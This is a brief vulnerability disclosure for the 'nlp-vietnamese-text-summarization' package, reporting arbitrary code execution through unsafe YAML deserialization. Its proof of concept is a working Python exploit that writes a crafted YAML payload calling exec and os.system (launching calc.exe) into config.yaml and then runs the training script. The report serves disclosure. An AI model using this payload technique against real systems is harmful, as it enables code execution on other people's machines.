# Description

`nlp-vietnamese-text-summarization` package is vulnerable to `Arbitary Code Execution` due to insecure yaml desearilization.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

_steps to reproduce:_
```python
import os

#os.system('https://github.com/ngockhanh5110/nlp-vietnamese-text-summarization')
os.chdir('nlp-vietnamese-text-summarization/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""

open('config.yaml','w+').write(payload)
os.system('python3 train.py')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
